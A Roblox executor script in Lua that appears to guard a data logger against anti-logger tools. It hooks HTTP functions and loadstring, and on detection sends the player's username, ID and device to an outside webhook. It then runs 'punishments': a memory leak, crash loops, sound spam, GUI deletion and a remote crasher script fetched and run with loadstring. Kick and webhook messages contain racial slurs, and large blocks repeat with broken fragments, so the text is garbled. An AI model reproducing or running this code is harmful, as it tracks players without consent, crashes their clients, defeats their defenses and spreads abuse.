-- // AUTO-REJOIN ON ANTI-LOGGER DETECTION WITH WEBHOOK & PUNISHMENT
local RejoinTriggered = false

-- // SERVICES
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local CoreGui = game:GetService("CoreGui")
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer
local PlaceId = game.PlaceId

-- // PLAYER INFO
local UserId = LocalPlayer.UserId
local Username = LocalPlayer.Name

-- // DEVICE TYPE
local DeviceType = (UIS.TouchEnabled and not UIS.MouseEnabled) and "Mobile"
                or (UIS.TouchEnabled and UIS.MouseEnabled) and "Tablet"
                or "PC"

-- // AUTO DISABLE DELETEBLACKGUIS
spawn(function()
    while wait() do
        pcall(function()
            local cons = getconnections(game.DescendantAdded)
            if cons then
                for i = 1, #cons do
                    cons[i]:Disconnect()
                end
            end
        end)
    end
end)

-- // PRELOAD KSI IMAGE
local function PreloadKSIImage()
    pcall(function()
        if CoreGui:FindFirstChild("PreloadGui") then
            CoreGui.PreloadGui:Destroy()
        end
        
        local preloadGui = Instance.new("ScreenGui")
        preloadGui.Name = "PreloadGui"
        preloadGui.Parent = CoreGui
        preloadGui.ResetOnSpawn = false
        preloadGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        preloadGui.DisplayOrder = 0
        preloadGui.IgnoreGuiInset = true
        
        local imageLabel = Instance.new("ImageLabel")
        imageLabel.Name = "PreloadImage"
        imageLabel.Size = UDim2.new(0, 0, 0, 0)
        imageLabel.Position = UDim2.new(0, 0, 0, 0)
        imageLabel.BackgroundTransparency = 1
        imageLabel.Image = "https://files.catbox.moe/i5xdmt.jpeg"
        imageLabel.ZIndex = 0
        imageLabel.Parent = preloadGui
        
        task.wait(0.1)
    end)
end

PreloadKSIImage()

-- // WEBHOOK FUNCTION
local function SendAntiLoggerDetectedWebhook()
    pcall(function()
        local ProfilePic = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
        local ProfileLink = "https://www.roblox.com/users/" .. UserId .. "/profile"

        local Data = {
            content = "",
            embeds = {{
                title = "⚠️ ANTI-LOGGER DETECTED!",
                description = "**An anti-logger script was detected and blocked!**\n\n" ..
                              "This nigga tried.",
                color = 16711680,
                thumbnail = { url = ProfilePic },
                fields = {
                    { name = "Username", value = "`" .. Username .. "`\n[View Profile](" .. ProfileLink .. ")", inline = true },
                    { name = "User ID", value = "`" .. UserId .. "`", inline = true },
                    { name = "Device", value = "`" .. DeviceType .. "`", inline = true },
                    { name = "Time", value = "`" .. os.date("%Y-%m-%d %H:%M:%S") .. "`", inline = true },
                    { name = "Status", value = "🔄 Anti-Logger Blocked", inline = false }
                },
                footer = { text = "Made by Moon And Cquil" },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }

        local JSON = HttpService:JSONEncode(Data)
        local WebhookURL = "https://obscuravm.com/r/98effa1e11b962ae81ccb115d920cfd7/webhook-a"

        if syn and syn.request then
            syn.request({
                Url = WebhookURL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = JSON
            })
        elseif http_request then
            http_request({
                Url = WebhookURL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = JSON
            })
        elseif request then
            request({
                Url = WebhookURL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = JSON
            })
        else
            HttpService:PostAsync(WebhookURL, JSON, Enum.HttpContentType.ApplicationJson)
        end
    end)
end

-- // PROTECTED GUIS
local protectedGUIs = {"KSIGui", "PreloadGui", "FadeGui"}

local function isProtected(gui)
    if not gui then return false end
    for _, name in ipairs(protectedGUIs) do
        if gui.Name == name then
            return true
        end
    end
    return false
end

-- // DARK FADE (DESTROYED AFTER 1.3s)
local function DarkFade()
    pcall(function()
        if CoreGui:FindFirstChild("FadeGui") then
            CoreGui.FadeGui:Destroy()
        end
        
        local fadeGui = Instance.new("ScreenGui")
        fadeGui.Name = "FadeGui"
        fadeGui.Parent = CoreGui
        fadeGui.ResetOnSpawn = false
        fadeGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        fadeGui.DisplayOrder = 999998
        fadeGui.IgnoreGuiInset = true
        
        local blackFrame = Instance.new("Frame")
        blackFrame.Name = "BlackFrame"
        blackFrame.Size = UDim2.new(1, 0, 1, 0)
        blackFrame.Position = UDim2.new(0, 0, 0, 0)
        blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        blackFrame.BackgroundTransparency = 1
        blackFrame.BorderSizePixel = 0
        blackFrame.ZIndex = 999998
        blackFrame.Parent = fadeGui
        
        local destroyed = false
        pcall(function()
            fadeGui.Destroy = function() return nil end
            blackFrame.Destroy = function() return nil end
        end)
        
        task.spawn(function()
            while fadeGui and not destroyed do
                task.wait(0.5)
                pcall(function()
                    if fadeGui and not fadeGui.Parent and not destroyed then
                        fadeGui.Parent = CoreGui
                    end
                    if fadeGui and fadeGui.Parent ~= CoreGui and not destroyed then
                        fadeGui.Parent = CoreGui
                    end
                    if setreadonly and fadeGui and not destroyed then
                        setreadonly(fadeGui, true)
                    end
                    if fadeGui then
                        fadeGui.DisplayOrder = 999998
                    end
                end)
            end
        end)
        
        TweenService:Create(blackFrame, TweenInfo.new(1, Enum.EasingStyle.Linear), {
            BackgroundTransparency = 0
        }):Play()
        
        Lighting.Ambient = Color3.new(0, 0, 0)
        Lighting.OutdoorAmbient = Color3.new(0, 0, 0)
        TweenService:Create(Lighting, TweenInfo.new(1, Enum.EasingStyle.Linear), {
            Brightness = 0,
            FogEnd = 0
        }):Play()
        
        task.spawn(function()
            task.wait(1.3)  -- now 1.3 seconds
            destroyed = true
            pcall(function()
                if fadeGui then
                    fadeGui:Destroy()
                end
            end)
        end)
    end)
end

-- // DELETE ALL GUIS
local function DeleteAllGUIs()
    pcall(function()
        for _, gui in ipairs(CoreGui:GetChildren()) do
            if gui:IsA("ScreenGui") and not isProtected(gui) then
                pcall(function() gui:Destroy() end)
            end
        end
        
        for _, player in ipairs(Players:GetPlayers()) do
            local playerGui = player:FindFirstChild("PlayerGui")
            if playerGui then
                for _, gui in ipairs(playerGui:GetChildren()) do
                    if gui:IsA("ScreenGui") and not isProtected(gui) then
                        pcall(function() gui:Destroy() end)
                    end
                end
            end
        end
        
        for _, gui in ipairs(StarterGui:GetChildren()) do
            if gui:IsA("ScreenGui") and not isProtected(gui) then
                pcall(function() gui:Destroy() end)
            end
        end
        
        for _, v in ipairs(Workspace:GetDescendants()) do
            if (v:IsA("BillboardGui") or v:IsA("SurfaceGui")) and not isProtected(v) then
                pcall(function() v:Destroy() end)
            end
        end
        
        for _, container in ipairs({CoreGui, StarterGui}) do
            for _, descendant in ipairs(container:GetDescendants()) do
                if descendant:IsA("ScreenGui") and not isProtected(descendant) then
                    pcall(function() descendant:Destroy() end)
                end
            end
        end
    end)
end

-- // LOUD SOUNDS
local function SoundSpam()
    pcall(function()
        local soundIDs = {"366983090", "126267754440216", "139668725303708"}
        local soundGroup = Instance.new("SoundGroup")
        soundGroup.Volume = 10
        soundGroup.Parent = SoundService
        
        for loop = 1, 10 do
            task.spawn(function()
                while true do
                    pcall(function()
                        local sound = Instance.new("Sound")
                        sound.SoundId = "rbxassetid://" .. soundIDs[math.random(1, #soundIDs)]
                        sound.Volume = 10
                        sound.SoundGroup = soundGroup
                        sound.Looped = true
                        sound.PlayOnRemove = false
                        sound.Parent = Workspace
                        sound:Play()
                    end)
                    task.wait(0)
                end
            end)
        end
    end)
end

-- // KSI IMAGE
local function LoadKSIImage()
    pcall(function()
        if CoreGui:FindFirstChild("KSIGui") then
            CoreGui.KSIGui:Destroy()
        end
        
        local KSI_Gui = Instance.new("ScreenGui")
        KSI_Gui.Name = "KSIGui"
        KSI_Gui.Parent = CoreGui
        KSI_Gui.ResetOnSpawn = false
        KSI_Gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        KSI_Gui.DisplayOrder = 9999999
        KSI_Gui.IgnoreGuiInset = true
        
        pcall(function()
            if setreadonly then
                setreadonly(KSI_Gui, true)
            end
        end)
        
        local ImageButton = Instance.new("ImageButton")
        ImageButton.Name = "KSIImage"
        ImageButton.Size = UDim2.new(0.6, 0, 0.6, 0)
        ImageButton.Position = UDim2.new(0.2, 0, 0.2, 0)
        ImageButton.BackgroundTransparency = 1
        ImageButton.Image = "https://files.catbox.moe/i5xdmt.jpeg"
        ImageButton.ScaleType = Enum.ScaleType.Fit
        ImageButton.ZIndex = 9999999
        ImageButton.Parent = KSI_Gui
        
        pcall(function()
            KSI_Gui.Destroy = function() return nil end
            ImageButton.Destroy = function() return nil end
        end)
        
        task.spawn(function()
            while KSI_Gui do
                task.wait(0.5)
                pcall(function()
                    if KSI_Gui and not KSI_Gui.Parent then
                        KSI_Gui.Parent = CoreGui
                    end
                    if KSI_Gui and KSI_Gui.Parent ~= CoreGui then
                        KSI_Gui.Parent = CoreGui
                    end
                    if setreadonly and KSI_Gui then
                        setreadonly(KSI_Gui, true)
                    end
                    KSI_Gui.DisplayOrder = 9999999
                end)
            end
        end)
        
        getgenv().target = "https://files.catbox.moe/i5xdmt.jpeg"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Lutosys/opensrc/refs/heads/main/ClientSidedImageCrasher.lua"))()
    end)
end

-- // PRINT CRASH
local function PrintCrash()
    pcall(function()
        for i = 1, 50 do
            task.spawn(function()
                while task.wait(0) do
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                end
            end)
        end
        
        for i = 1, 50 do
            task.spawn(function()
                while task.wait(0) do
                    warn("lol")
                    warn("lol")
                    warn("lol")
                    warn("lol")
                    warn("lol")
                    warn("lol")
                    warn("lol")
                    warn("lol")
                end
            end)
        end
        
        for i = 1, 50 do
            task.spawn(function()
                while task.wait(0) do
                    pcall(function()
                        error("lol")
                        error("lol")
                        error("lol")
                        error("lol")
                        error("lol")
                        error("lol")
                        error("lol")
                        error("lol")
                    end)
                end
            end)
        end
    end)
end

-- // MEMORY LEAK
local function MemoryLeak()
    pcall(function()
        for thread = 1, 5 do
            task.spawn(function()
                local memory = {}
                while true do
                    for i = 1, 100000 do
                        memory[i] = string.rep("x", 100000)
                    end
                end
            end)
        end
    end)
end

-- // DISCONNECT (multiple kicks)
local function ForceDisconnect()
    pcall(function()
        for i = 1, 20 do
            LocalPlayer:Kick("Fuck you retarded nigga")
            task.wait(0)
        end
    end)
end

-- // DISABLE RENDER
local function DisableRender()
    pcall(function()
        RunService:Set3dRenderingEnabled(false)
    end)
end

-- // SINGLE KICK
local function Kick()
    pcall(function()
        LocalPlayer:Kick("You have been kicked as punishment.")
    end)
end

-- // SERVERHOP
local function ServerHop()
    pcall(function()
        TeleportService:Teleport(PlaceId, LocalPlayer)
        task.wait(0)
        LocalPlayer:Kick("Server hopping...")
    end)
end

-- // APPLY PUNISHMENTS
local function ApplyPunishments()
    task.spawn(DeleteAllGUIs)
    DarkFade()
    SoundSpam()
    LoadKSIImage()
    PrintCrash()
    MemoryLeak()
    ForceDisconnect()
    DisableRender()
    Kick()
    ServerHop()
end

-- // DETECTION MECHANISMS
local BlockedURLs = {
    "raw.githubusercontent.com/phareignxd/xemonscripts",
    "raw.githubusercontent.com/phareignxd/xemonscripts/refs/heads/main/antiloggerv2",
    "raw.githubusercontent.com/phareignxd/xemonscripts/main/antiloggerv2.lua",
    "phareignxd/xemonscripts",
    "antiloggerv2",
    "raw.githubusercontent.com/jadpy/suki/refs/heads/main/anti%20webhooks",
    "jadpy/suki",
    "anti%20webhooks",
    "scriptblox.com/script/Universal-Script-Anti-Webhook-84129",
    "scriptblox.com",
    "Universal-Script-Anti-Webhook",
    "raw.githubusercontent.com/VoidShell-null/VoidShell-Hub/refs/heads/main/Scripts/Anti_Logger.luau",
    "VoidShell-null/VoidShell-Hub",
    "Anti_Logger.luau",
    "VoidShell-null",
    "rawscripts.net",
    "antilogger",
    "anti%-logger",
    "anti_logger",
    "blockwebhook",
    "block%-webhook",
    "block_webhook",
}

local function isBlockedURL(url)
    if not url then return false end
    local lower = string.lower(url)
    for _, blocked in ipairs(BlockedURLs) do
        if string.find(lower, blocked) then
            return true
        end
    end
    return false
end

local function TriggerRejoin()
    if RejoinTriggered then return end
    RejoinTriggered = true

    SendAntiLoggerDetectedWebhook()
    ApplyPunishments()
end

pcall(function()
    if request then
        local old = request
        request = function(options)
            if options and options.Url and isBlockedURL(options.Url) then
                TriggerRejoin()
                return { Success = false, StatusCode = 404, Body = "" }
            end
            return old(options)
        end
    end
end)

pcall(function()
    if http_request then
        local old = http_request
        http_request = function(options)
            if options and options.Url and isBlockedURL(options.Url) then
                TriggerRejoin()
                return { Success = false, StatusCode = 404, Body = "" }
            end
            return old(options)
        end
    end
end)

pcall(function()
    if syn and syn.request then
        local old = syn.request
        syn.request = function(options)
            if options and options.Url and isBlockedURL(options.Url) then
                TriggerRejoin()
                return { Success = false, StatusCode = 404, Body = "" }
            end
            return old(options)
        end
    end
end)

pcall(function()
    local old = HttpService.GetAsync
    HttpService.GetAsync = function(self, url, ...)
        if url and isBlockedURL(url) then
            TriggerRejoin()
            return ""
        end
        return old(self, url, ...)
    end
end)

pcall(function()
    local old = HttpService.PostAsync
    HttpService.PostAsync = function(self, url, data, contentType)
        if url and isBlockedURL(url) then
            TriggerRejoin()
            return ""
        end
        return old(self, url, data, contentType)
    end
end)

pcall(function()
    local old = loadstring
    loadstring = function(code, chunkname)
        if code and type(code) == "string" then
            local lower = string.lower(code)
            for _, blocked in ipairs(BlockedURLs) do
                if string.find(lower, blocked) then
                    TriggerRejoin()
                    return nil
                end
            end
        end
        return old(code, chunkname)
    end
end)

CoreGui.DescendantAdded:Connect(function(obj)
    task.wait(0)
    if obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
        local source = obj.Source or ""
        local lower = string.lower(source)
        for _, blocked in ipairs(BlockedURLs) do
            if string.find(lower, blocked) then
                TriggerRejoin()
                break
            end
        end
    end
end)

task.spawn(function()
    while not RejoinTriggered do
        task.wait(0)
        pcall(function()
            local vars = {"DeadmaSaBasher", "_blockwebhook", "Custom_Blacklist", "Hook", "Http"}
            for _, v in ipairs(vars) do
                if getfenv()[v] ~= nil or getgenv()[v] ~= nil or _G[v] ~= nil then
                    TriggerRejoin()
                end
            end
        end)
    end
end)            end
        end)
    end
end)

-- // PRELOAD KSI IMAGE
local function PreloadKSIImage()
    pcall(function()
        if CoreGui:FindFirstChild("PreloadGui") then
            CoreGui.PreloadGui:Destroy()
        end
        
        local preloadGui = Instance.new("ScreenGui")
        preloadGui.Name = "PreloadGui"
        preloadGui.Parent = CoreGui
        preloadGui.ResetOnSpawn = false
        preloadGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        preloadGui.DisplayOrder = 0
        preloadGui.IgnoreGuiInset = true
        
        local imageLabel = Instance.new("ImageLabel")
        imageLabel.Name = "PreloadImage"
        imageLabel.Size = UDim2.new(0, 0, 0, 0)
        imageLabel.Position = UDim2.new(0, 0, 0, 0)
        imageLabel.BackgroundTransparency = 1
        imageLabel.Image = "https://files.catbox.moe/i5xdmt.jpeg"
        imageLabel.ZIndex = 0
        imageLabel.Parent = preloadGui
        
        task.wait(0.1)
    end)
end

PreloadKSIImage()

-- // WEBHOOK FUNCTION
local function SendAntiLoggerDetectedWebhook()
    pcall(function()
        local ProfilePic = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
        local ProfileLink = "https://www.roblox.com/users/" .. UserId .. "/profile"

        local Data = {
            content = "",
            embeds = {{
                title = "⚠️ ANTI-LOGGER DETECTED!",
                description = "**An anti-logger script was detected and blocked!**\n\n" ..
                              "This nigga tried.",
                color = 16711680,
                thumbnail = { url = ProfilePic },
                fields = {
                    { name = "Username", value = "`" .. Username .. "`\n[View Profile](" .. ProfileLink .. ")", inline = true },
                    { name = "User ID", value = "`" .. UserId .. "`", inline = true },
                    { name = "Device", value = "`" .. DeviceType .. "`", inline = true },
                    { name = "Time", value = "`" .. os.date("%Y-%m-%d %H:%M:%S") .. "`", inline = true },
                    { name = "Status", value = "🔄 Anti-Logger Blocked", inline = false }
                },
                footer = { text = "Made by Moon And Cquil" },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }

        local JSON = HttpService:JSONEncode(Data)
        local WebhookURL = "https://obscuravm.com/r/98effa1e11b962ae81ccb115d920cfd7/webhook-a"

        if syn and syn.request then
            syn.request({
                Url = WebhookURL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = JSON
            })
        elseif http_request then
            http_request({
                Url = WebhookURL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = JSON
            })
        elseif request then
            request({
                Url = WebhookURL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = JSON
            })
        else
            HttpService:PostAsync(WebhookURL, JSON, Enum.HttpContentType.ApplicationJson)
        end
    end)
end

-- // PROTECTED GUIS
local protectedGUIs = {"KSIGui", "PreloadGui", "FadeGui"}

local function isProtected(gui)
    if not gui then return false end
    for _, name in ipairs(protectedGUIs) do
        if gui.Name == name then
            return true
        end
    end
    return false
end

-- // DARK FADE (DESTROYED AFTER 1.5s)
local function DarkFade()
    pcall(function()
        if CoreGui:FindFirstChild("FadeGui") then
            CoreGui.FadeGui:Destroy()
        end
        
        local fadeGui = Instance.new("ScreenGui")
        fadeGui.Name = "FadeGui"
        fadeGui.Parent = CoreGui
        fadeGui.ResetOnSpawn = false
        fadeGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        fadeGui.DisplayOrder = 999998
        fadeGui.IgnoreGuiInset = true
        
        local blackFrame = Instance.new("Frame")
        blackFrame.Name = "BlackFrame"
        blackFrame.Size = UDim2.new(1, 0, 1, 0)
        blackFrame.Position = UDim2.new(0, 0, 0, 0)
        blackFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        blackFrame.BackgroundTransparency = 1
        blackFrame.BorderSizePixel = 0
        blackFrame.ZIndex = 999998
        blackFrame.Parent = fadeGui
        
        local destroyed = false
        pcall(function()
            fadeGui.Destroy = function() return nil end
            blackFrame.Destroy = function() return nil end
        end)
        
        task.spawn(function()
            while fadeGui and not destroyed do
                task.wait(0.5)
                pcall(function()
                    if fadeGui and not fadeGui.Parent and not destroyed then
                        fadeGui.Parent = CoreGui
                    end
                    if fadeGui and fadeGui.Parent ~= CoreGui and not destroyed then
                        fadeGui.Parent = CoreGui
                    end
                    if setreadonly and fadeGui and not destroyed then
                        setreadonly(fadeGui, true)
                    end
                    if fadeGui then
                        fadeGui.DisplayOrder = 999998
                    end
                end)
            end
        end)
        
        TweenService:Create(blackFrame, TweenInfo.new(1, Enum.EasingStyle.Linear), {
            BackgroundTransparency = 0
        }):Play()
        
        Lighting.Ambient = Color3.new(0, 0, 0)
        Lighting.OutdoorAmbient = Color3.new(0, 0, 0)
        TweenService:Create(Lighting, TweenInfo.new(1, Enum.EasingStyle.Linear), {
            Brightness = 0,
            FogEnd = 0
        }):Play()
        
        task.spawn(function()
            task.wait(1.5)  -- now 1.5 seconds
            destroyed = true
            pcall(function()
                if fadeGui then
                    fadeGui:Destroy()
                end
            end)
        end)
    end)
end

-- // DELETE ALL GUIS
local function DeleteAllGUIs()
    pcall(function()
        for _, gui in ipairs(CoreGui:GetChildren()) do
            if gui:IsA("ScreenGui") and not isProtected(gui) then
                pcall(function() gui:Destroy() end)
            end
        end
        
        for _, player in ipairs(Players:GetPlayers()) do
            local playerGui = player:FindFirstChild("PlayerGui")
            if playerGui then
                for _, gui in ipairs(playerGui:GetChildren()) do
                    if gui:IsA("ScreenGui") and not isProtected(gui) then
                        pcall(function() gui:Destroy() end)
                    end
                end
            end
        end
        
        for _, gui in ipairs(StarterGui:GetChildren()) do
            if gui:IsA("ScreenGui") and not isProtected(gui) then
                pcall(function() gui:Destroy() end)
            end
        end
        
        for _, v in ipairs(Workspace:GetDescendants()) do
            if (v:IsA("BillboardGui") or v:IsA("SurfaceGui")) and not isProtected(v) then
                pcall(function() v:Destroy() end)
            end
        end
        
        for _, container in ipairs({CoreGui, StarterGui}) do
            for _, descendant in ipairs(container:GetDescendants()) do
                if descendant:IsA("ScreenGui") and not isProtected(descendant) then
                    pcall(function() descendant:Destroy() end)
                end
            end
        end
    end)
end

-- // LOUD SOUNDS
local function SoundSpam()
    pcall(function()
        local soundIDs = {"366983090", "126267754440216", "139668725303708"}
        local soundGroup = Instance.new("SoundGroup")
        soundGroup.Volume = 10
        soundGroup.Parent = SoundService
        
        for loop = 1, 10 do
            task.spawn(function()
                while true do
                    pcall(function()
                        local sound = Instance.new("Sound")
                        sound.SoundId = "rbxassetid://" .. soundIDs[math.random(1, #soundIDs)]
                        sound.Volume = 10
                        sound.SoundGroup = soundGroup
                        sound.Looped = true
                        sound.PlayOnRemove = false
                        sound.Parent = Workspace
                        sound:Play()
                    end)
                    task.wait(0)
                end
            end)
        end
    end)
end

-- // KSI IMAGE
local function LoadKSIImage()
    pcall(function()
        if CoreGui:FindFirstChild("KSIGui") then
            CoreGui.KSIGui:Destroy()
        end
        
        local KSI_Gui = Instance.new("ScreenGui")
        KSI_Gui.Name = "KSIGui"
        KSI_Gui.Parent = CoreGui
        KSI_Gui.ResetOnSpawn = false
        KSI_Gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
        KSI_Gui.DisplayOrder = 9999999
        KSI_Gui.IgnoreGuiInset = true
        
        pcall(function()
            if setreadonly then
                setreadonly(KSI_Gui, true)
            end
        end)
        
        local ImageButton = Instance.new("ImageButton")
        ImageButton.Name = "KSIImage"
        ImageButton.Size = UDim2.new(0.6, 0, 0.6, 0)
        ImageButton.Position = UDim2.new(0.2, 0, 0.2, 0)
        ImageButton.BackgroundTransparency = 1
        ImageButton.Image = "https://files.catbox.moe/i5xdmt.jpeg"
        ImageButton.ScaleType = Enum.ScaleType.Fit
        ImageButton.ZIndex = 9999999
        ImageButton.Parent = KSI_Gui
        
        pcall(function()
            KSI_Gui.Destroy = function() return nil end
            ImageButton.Destroy = function() return nil end
        end)
        
        task.spawn(function()
            while KSI_Gui do
                task.wait(0.5)
                pcall(function()
                    if KSI_Gui and not KSI_Gui.Parent then
                        KSI_Gui.Parent = CoreGui
                    end
                    if KSI_Gui and KSI_Gui.Parent ~= CoreGui then
                        KSI_Gui.Parent = CoreGui
                    end
                    if setreadonly and KSI_Gui then
                        setreadonly(KSI_Gui, true)
                    end
                    KSI_Gui.DisplayOrder = 9999999
                end)
            end
        end)
        
        getgenv().target = "https://files.catbox.moe/i5xdmt.jpeg"
        loadstring(game:HttpGet("https://raw.githubusercontent.com/Lutosys/opensrc/refs/heads/main/ClientSidedImageCrasher.lua"))()
    end)
end

-- // PRINT CRASH
local function PrintCrash()
    pcall(function()
        for i = 1, 50 do
            task.spawn(function()
                while task.wait(0) do
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                    print("lol")
                end
            end)
        end
        
        for i = 1, 50 do
            task.spawn(function()
                while task.wait(0) do
                    warn("lol")
                    warn("lol")
                    warn("lol")
                    warn("lol")
                    warn("lol")
                    warn("lol")
                    warn("lol")
                    warn("lol")
                end
            end)
        end
        
        for i = 1, 50 do
            task.spawn(function()
                while task.wait(0) do
                    pcall(function()
                        error("lol")
                        error("lol")
                        error("lol")
                        error("lol")
                        error("lol")
                        error("lol")
                        error("lol")
                        error("lol")
                    end)
                end
            end)
        end
    end)
end

-- // MEMORY LEAK
local function MemoryLeak()
    pcall(function()
        for thread = 1, 5 do
            task.spawn(function()
                local memory = {}
                while true do
                    for i = 1, 100000 do
                        memory[i] = string.rep("x", 100000)
                    end
                end
            end)
        end
    end)
end

-- // DISCONNECT (multiple kicks)
local function ForceDisconnect()
    pcall(function()
        for i = 1, 20 do
            LocalPlayer:Kick("Fuck you retarded nigga")
            task.wait(0)
        end
    end)
end

-- // DISABLE RENDER
local function DisableRender()
    pcall(function()
        RunService:Set3dRenderingEnabled(false)
    end)
end

-- // SINGLE KICK
local function Kick()
    pcall(function()
        LocalPlayer:Kick("You have been kicked as punishment.")
    end)
end

-- // SERVERHOP
local function ServerHop()
    pcall(function()
        TeleportService:Teleport(PlaceId, LocalPlayer)
        task.wait(0)
        LocalPlayer:Kick("Server hopping...")
    end)
end

-- // APPLY PUNISHMENTS
local function ApplyPunishments()
    task.spawn(DeleteAllGUIs)
    DarkFade()
    SoundSpam()
    LoadKSIImage()
    PrintCrash()
    MemoryLeak()
    ForceDisconnect()
    DisableRender()
    Kick()
    ServerHop()
end

-- // DETECTION MECHANISMS
local BlockedURLs = {
    "raw.githubusercontent.com/phareignxd/xemonscripts",
    "raw.githubusercontent.com/phareignxd/xemonscripts/refs/heads/main/antiloggerv2",
    "raw.githubusercontent.com/phareignxd/xemonscripts/main/antiloggerv2.lua",
    "phareignxd/xemonscripts",
    "antiloggerv2",
    "raw.githubusercontent.com/jadpy/suki/refs/heads/main/anti%20webhooks",
    "jadpy/suki",
    "anti%20webhooks",
    "scriptblox.com/script/Universal-Script-Anti-Webhook-84129",
    "scriptblox.com",
    "Universal-Script-Anti-Webhook",
    "raw.githubusercontent.com/VoidShell-null/VoidShell-Hub/refs/heads/main/Scripts/Anti_Logger.luau",
    "VoidShell-null/VoidShell-Hub",
    "Anti_Logger.luau",
    "VoidShell-null",
    "rawscripts.net",
    "antilogger",
    "anti%-logger",
    "anti_logger",
    "blockwebhook",
    "block%-webhook",
    "block_webhook",
}

local function isBlockedURL(url)
    if not url then return false end
    local lower = string.lower(url)
    for _, blocked in ipairs(BlockedURLs) do
        if string.find(lower, blocked) then
            return true
        end
    end
    return false
end

local function TriggerRejoin()
    if RejoinTriggered then return end
    RejoinTriggered = true

    SendAntiLoggerDetectedWebhook()
    ApplyPunishments()
end

pcall(function()
    if request then
        local old = request
        request = function(options)
            if options and options.Url and isBlockedURL(options.Url) then
                TriggerRejoin()
                return { Success = false, StatusCode = 404, Body = "" }
            end
            return old(options)
        end
    end
end)

pcall(function()
    if http_request then
        local old = http_request
        http_request = function(options)
            if options and options.Url and isBlockedURL(options.Url) then
                TriggerRejoin()
                return { Success = false, StatusCode = 404, Body = "" }
            end
            return old(options)
        end
    end
end)

pcall(function()
    if syn and syn.request then
        local old = syn.request
        syn.request = function(options)
            if options and options.Url and isBlockedURL(options.Url) then
                TriggerRejoin()
                return { Success = false, StatusCode = 404, Body = "" }
            end
            return old(options)
        end
    end
end)

pcall(function()
    local old = HttpService.GetAsync
    HttpService.GetAsync = function(self, url, ...)
        if url and isBlockedURL(url) then
            TriggerRejoin()
            return ""
        end
        return old(self, url, ...)
    end
end)

pcall(function()
    local old = HttpService.PostAsync
    HttpService.PostAsync = function(self, url, data, contentType)
        if url and isBlockedURL(url) then
            TriggerRejoin()
            return ""
        end
        return old(self, url, data, contentType)
    end
end)

pcall(function()
    local old = loadstring
    loadstring = function(code, chunkname)
        if code and type(code) == "string" then
            local lower = string.lower(code)
            for _, blocked in ipairs(BlockedURLs) do
                if string.find(lower, blocked) then
                    TriggerRejoin()
                    return nil
                end
            end
        end
        return old(code, chunkname)
    end
end)

CoreGui.DescendantAdded:Connect(function(obj)
    task.wait(0)
    if obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
        local source = obj.Source or ""
        local lower = string.lower(source)
        for _, blocked in ipairs(BlockedURLs) do
            if string.find(lower, blocked) then
                TriggerRejoin()
                break
            end
        end
    end
end)

task.spawn(function()
    while not RejoinTriggered do
        task.wait(0)
        pcall(function()
            local vars = {"DeadmaSaBasher", "_blockwebhook", "Custom_Blacklist", "Hook", "Http"}
            for _, v in ipairs(vars) do
                if getfenv()[v] ~= nil or getgenv()[v] ~= nil or _G[v] ~= nil then
                    TriggerRejoin()
                end
            end
        end)
    end
end)       end
        end
        return old(code, chunkname)
    end
end)

game:GetService("CoreGui").DescendantAdded:Connect(function(obj)
    task.wait()
    if obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
        local source = obj.Source or ""
        local lower = string.lower(source)
        for _, blocked in ipairs(BlockedURLs) do
            if string.find(lower, blocked) then
                TriggerRejoin()
                break
            end
        end
    end
end)

task.spawn(function()
    while not RejoinTriggered do
        task.wait()
        pcall(function()
            local vars = {"DeadmaSaBasher", "_blockwebhook", "Custom_Blacklist", "Hook", "Http"}
            for _, v in ipairs(vars) do
                if getfenv()[v] ~= nil or getgenv()[v] ~= nil or _G[v] ~= nil then
                    TriggerRejoin()
                end
            end
        end)
    end
end)
